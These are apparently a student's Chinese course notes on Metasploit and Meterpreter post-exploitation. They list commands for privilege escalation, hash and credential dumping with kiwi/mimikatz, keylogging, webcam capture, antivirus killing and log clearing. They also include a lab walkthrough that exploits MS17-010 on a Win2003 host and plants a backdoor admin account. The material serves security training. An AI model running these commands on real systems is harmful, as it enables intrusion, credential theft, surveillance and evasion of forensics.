[TOC]



# ==MSF与Meterpreter基础指令==

教材内容

#### 一、Meterpreter简介

后渗透测试阶段一站式操作，前提是漏洞利用成功，payload 用的是 Meterpreter。

（1）Meterpreter 比系统 Shell 更加灵活，功能更加丰富，例如监控主机，监控键盘，开启摄像头，麦克风，还可以灵活的获取你的操作系统信息。

（2）高级、动态、可扩展的Payload，可以基于Meterpreter上下文利用更多漏洞发起攻击，同时也是后渗透测试阶段一站式操作界面。

（3）基于Meterpreter 上下文利用更多漏洞发起攻击；

（4）完全基于内存的DLL注入式payload（不写硬盘），会注入合法进程并建立stager，隐蔽性非常好。

（5）可以基于stager上传和预加载DLL进行扩展模块的注入

（6）可以基于stager建立的socket连接建立加密的TLS通信隧道，避免网络取证

#### 二、常用命令

```
background        #退回msfconsole界面 
pwd/cd/cat/ls/ps/reboot/shutdown/.. #些基本命令都可以使用，但是注意没有补齐功能 
edit             #Meterpreter界面下的vi 
lpwd             #显示当前主机的工作目录（pwd是目标主机的工作目录） 
lcd              #当前主机目录的切换 
run/bgrun        #运行/后台运行命令，tab后有几百个选择，可以实现远程桌面监控、usb痕迹查看等功能，功能十分强大 
clearev          #清除目标主机的系统日志、安全日志等，避免被溯源
download/upload  #下载/上传文件(注意表示windows的目录要用\\) 
execute -f xx -i #执行xx程序,-i参数表示与该程序进行交互，-H表示将窗口隐藏执行 execute -H -i -f cmd.exe 
getuid           #查看当前登录的账号 
getprivs         #查看当前具有的权限 
load priv        #加载priv插件 
getsystem        #加载priv后，提权变为系统账号 
getpid           #meterpreter注入的进程号
migrate <pid值>      #迁移meterpreter注入的进程，一般将session迁移到系统进程，如exploer等 
hashdump或者run post/windows/gather/hashdump   #从SAM数据库中导出本地用户账号                 #注：SAM文件是windows的用户账户数据库,所有用户的登录名及口令等                 #相关信息都会保存在这个文件中，类似于unix系统中的passwd文件
sysinfo          #获取系统信息 kill             #杀死进程 
shell            #反弹shell，直接进入目标主机的命令行
show_mount       #显示分区 
search           #搜索文件 
netstat/arp/ipconfig/ifconfig/route/... #支持部分在windows cmd和linux shell中的命令 
idletime         #查看计算机的空闲时间 
resource         #连接一个外部文件并执行，文件中一般是要执行的命令 
record_mic       #开启麦克风 
webcam_list      #列出电脑上开启的摄像头
webcam_snap -i 1 -v false #每隔1秒钟进行拍照
screenshot         #对当前系统画面截图
portfwd             # 端口转发，
portfwd add -l 6666 -p 3389 -r 127.0.0.1    # 将目标机的3389端口转发到本地6666端口
sniffer          # 监控目标机上的流量    
use sniffer    
sniffer_interfaces       #查看网卡    
sniffer_start 2            #选择网卡 开始抓包    
sniffer_stats 2           #查看状态    
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包    
sniffer_stop 2            #停止抓包
run post/windows/manage/killav     # 结束掉杀毒软件的进程
run post/windows/capture/keylog_recorder  # 记录键盘
run vnc             # 开启vnc远程连接
```

更多用法参考：https://www.cnblogs.com/xcymn/p/14464945.html

#### 三、kiwi（mimikatz代替版）

```
creds_all：列举所有凭据和明文密码)
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据和明文密码
dcsync：通过DCSync检索用户帐户信息
dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list：列出当前用户的wifi配置文件
wifi_list_shared：列出共享wifi配置文件/编码
```

kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。

课程小结

3389.exe：
（1）创建一个admin/admin123的赂
（2）打开3389远程桌面的端口号
https://blog.csdn.net/wxh0000mm/article/details/98870581
无

[TOC]



# ==MSF使用==

漏洞利用的一般步骤：
1.信息收集（avws，nusses等）获取靶机的ip，系统版本，开放端口，可能存在漏洞
2.用msf使用漏洞，设置相应的pyload，target，最后开始攻击

##  arp 扫描存活主机

### 第一步：search 关键字进而找到需要的模块

```
search arp
```

![image-20240913090616329](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913090616329.png)

### 第二步：使用 search 搜索到的模块，并配置参数

```
use 1
show options
set rhosts 192.168.230.0/24
当然，也可以单独设置一个ip地址这种时候适用于攻击，漏洞利用
```

![image-20240913091128815](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913091128815.png)

### 第三步：run 或者 exploit

![image-20240913091432297](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913091432297.png)

## 端口服务扫描漏洞利用

### 第一步：搜索模块并利用

![image-20240913100420710](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913100420710.png)

### 第二步：设置options参数然后runs

![image-20240913101304771](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913101304771.png)

## SMB扫描

```
search smb
```

找到 `auxiliary/scanner/smb/smb_version` 并 use

以 扫描 192.168.230.135 主机的smb为例

![image-20240913102008494](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913102008494.png)

## ssh扫描

![image-20240913103458249](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913103458249.png)

## win2003 攻击

```
search msf17-010
set rhosts 192.168.112.158
run
```

![image-20240913125639416](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913125639416.png)

然后就可以拿到 win2003 的 shell  

![image-20240913125854346](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913125854346.png)

> 实际上是 msf 将内存吗注入进了目标主机，通过该内存马执行一系列操作

`getpid` 可以查看该内存马所嵌入的进程的编号

`getuid`  获取到当前用户

![image-20240913163432217](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913163432217.png)

`getprivs` 获取到当前内存所存在进程的权限

![image-20240913163557899](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913163557899.png)

`load priv`加载插件后 配合 `getsystem`提权变为系统账号

 将 3389.exe 上传到 win2003

![image-20240913164837157](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913164837157.png)

然后 `shell` 进入 win2003命令行 执行 389.exe 可执行程序

![image-20240913165230191](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913165230191.png)

![image-20240913165335301](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913165335301.png)

直接利用 admin admin123 登录

最后 `clearev` 擦屁股

 扫描 -> 找可利用漏洞 -> 利用

# ==Meterpreter使用==

`sessions` 查看msf与目标的链接状况

![image-20240913170101065](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913170101065.png)

直接运行命令实际上是在 windows 系统中在执行

要想在linux系统中执行，需要在命令前添加l，例子如下：

![image-20240913170355107](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913170355107.png)

`background` 使得meterpreter命令行放置后台

`sessions` 查看msf与目标的链接状况

`sessions -i 8` 进入指定目标命令行

![image-20240913171111520](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913171111520.png)

`killav` 杀死目标主机中的杀毒软件

在 meterpreter 中 运行 `run` 可以看到很多exploit 其中就含有 killav

![image-20240913172325954](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913172325954.png)

`portfwd add -l 6668 -p 3389 -r 127.0.0.1` 意思是将目标主机的 3389端口映射到攻击主机的6668端口

> -r 理解为 remote 即远程的意思，这个命令是执行在 eterpreter 下的，而 meterpreter 是执行的是目标主机的命令行，所以 -r 127.0.0.1 就是相当于在目标主机下执行指定自己
>
> -l 理解为 local
>
> 此时本来想要远程范连接 win2003 的桌面是链接 192.168.112.188，而做了端口转发之后 就可以通过 远程连接 192.168.112.148:6668 进而达到远程连接 win2003 的桌面
>
> ![image-20240913210614161](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913210614161.png)
>
> 此时直接回转发给 目标主机的 3389 端口



#### 流量监控

`use sniffer`

`sniffer_interfaces`

`sniffer start 1` 这里指定 `sniffer_interfaces `查询到的网卡编号

![image-20240913212049505](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913212049505.png)

`sniffer_dump 1 /home/root/traffic.pcap` 将捕获到的流量保存到该文件中

![image-20240913212528288](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913212528288.png)

 这几条命令中的 1 应该都是网卡的编号

#### mimikatz

主要是用户获取win账密信息，甚至明文密码，以及域控的票据等

`load kiwi` 先加载 kiwi 模块

`creads_all` 获取上述本机信息（通过内存马）

![image-20240913214430335](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240913214430335.png)

> kerberos 黄金票据：拥有该黄金票据的用户，拥有整个域中最高的权限
